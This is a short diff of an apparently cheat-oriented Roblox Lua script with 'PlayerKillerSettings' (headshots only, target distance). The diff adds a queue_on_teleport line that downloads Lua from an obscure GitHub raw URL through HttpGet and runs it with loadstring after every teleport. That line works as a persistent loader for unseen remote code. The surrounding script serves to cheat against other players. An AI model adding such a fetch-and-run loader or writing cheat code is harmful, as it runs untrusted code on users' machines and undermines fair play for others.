@@ -1,3 +1,5 @@
+queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/vfx-qudsa/asfsadasdasdasdsa/refs/heads/main/.lua'))()")
+
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -7,6 +9,7 @@ local PlayerKillerSettings = {
     OnlyHeadshots = true,
     TargetDistance = 1000
 }
+
 
 while true do
 
